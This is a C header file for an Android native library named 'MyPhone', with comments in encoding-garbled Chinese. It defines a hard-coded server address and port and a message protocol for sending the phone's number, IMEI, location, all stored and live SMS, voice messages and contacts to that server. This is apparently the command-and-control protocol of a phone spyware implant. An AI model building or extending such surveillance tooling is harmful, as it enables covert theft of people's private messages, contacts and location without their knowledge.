#ifndef _Included_com_example_myphone_common_h
#define _Included_com_example_myphone_common_h

#include <android/log.h>

#define TAG "MyPhone"
#define LOGV(...) __android_log_print(ANDROID_LOG_VERBOSE, TAG, __VA_ARGS__)
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG , TAG, __VA_ARGS__)
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO , TAG, __VA_ARGS__)
#define LOGW(...) __android_log_print(ANDROID_LOG_WARN , TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR , TAG, __VA_ARGS__)

#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <errno.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>

#define SLEEPTIME	 1
#define DEBUG		 true
#define SERVER_IP    "10.0.0.120"
#define SERVER_PORT   13389
#define NULL 0
#define INVALID_SOCKET -1
#define EOK				0

//����ṹ�嶨��
#define MSGTYPE_BASEPHONEINFO       0x1			//�ֻ�������Ϣ
#define MSGTYPE_GETLOCALTION        0x2			//��ȡ�ֻ���λ��Ϣ
#define MSGTYPE_QUERYAllSMS         0x3			//�����ȡ�ֻ�����SMS��Ϣ
#define MSGTYPE_AllSMSBACK          0x13		//�����ֻ�����SMS��Ϣ
#define MSGTYPE_SMSIN               0x4			//��ȡʵʱ�յ���SMS��Ϣ
#define MSGTYPE_SMSOUT              0x5			//��ȡʵʱ���͵�SMS��Ϣ
#define MSGTYPE_VOICESMS            0x6			//��ͨ����Ϣ��Ϣ
#define MSGTYPE_CONTACTSINFO        0x7			//��ϵ����Ϣ
#define MSGTYPE_QUERYCONTACTS		0x8			//��������ϵ����Ϣ
#define MAXMSGLENGTH				0x10000		//���SMS��Ϣ����󻺳�������
//////////////////////////////////////////////////////////////////////////
//���ݰ�ͷ��,���е����ݰ�����MSG_HEAD��ͷ
//////////////////////////////////////////////////////////////////////////
typedef struct tagMSG_HEAD
{
    int dwCmdId;               //��������
    int dwCmdLength;           //�������ĳ���
}MSG_HEAD;
//////////////////////////////////////////////////////////////////////////
//�ֻ�������Ϣ
//////////////////////////////////////////////////////////////////////////
typedef struct tagBasePhoneInfo
{
    char szPhoneNum[16];        //�ֻ�����
    char szPhoneModel[32];      //�ֻ��ͺ�
    char szSystemVersion[16];   //�ֻ�ϵͳ�汾
    char szIMEI[20];            //IMEI��
} BASEPHONEINFO, *PBASEPHONEINFO;
//////////////////////////////////////////////////////////////////////////
//�����ȡ����SMS��Ϣ��ʽ
//////////////////////////////////////////////////////////////////////////
typedef struct tagQueryAllSMS
{
    long long lMinDate;            	//��������С������
} QUERYALLSMS, *PQUERYALLSMS;
//////////////////////////////////////////////////////////////////////////
//����SMS��Ϣ����
//////////////////////////////////////////////////////////////////////////
typedef struct tagAllSms
{
	char szAllMsg[MAXMSGLENGTH];
} ALLSMS, *PALLSMS;
//////////////////////////////////////////////////////////////////////////
//��SMS��Ϣ����
//////////////////////////////////////////////////////////////////////////
typedef struct tagNewSms
{
	char szMsg[MAXMSGLENGTH];
} NEWSMS, *PNEWSMS;
//////////////////////////////////////////////////////////////////////////
//��VOICE��Ϣ����
//////////////////////////////////////////////////////////////////////////
typedef struct tagNewVoice
{
	char szMsg[MAXMSGLENGTH];
} NEWVOICE, *PNEWVOICE;
//////////////////////////////////////////////////////////////////////////
//��ϵ����Ϣ����
//////////////////////////////////////////////////////////////////////////
typedef struct tagContacts
{
	char szMsg[MAXMSGLENGTH];
} CONTACTS, *PCONTACTS;
//////////////////////////////////////////////////////////////////////////
//���е����ݰ������ṹ
//////////////////////////////////////////////////////////////////////////
typedef struct tagMSG_STRUCT
{
    MSG_HEAD Msg_Head;
    union
    {
        BASEPHONEINFO BasePhoneInfo;
        QUERYALLSMS   QueryAllSms;
        ALLSMS		  AllSms;
        NEWSMS	      NewSms;
        NEWVOICE	  NewVoiceMsg;
        CONTACTS	  Contacts;
    };
} MSG_STRUCT;
#endif
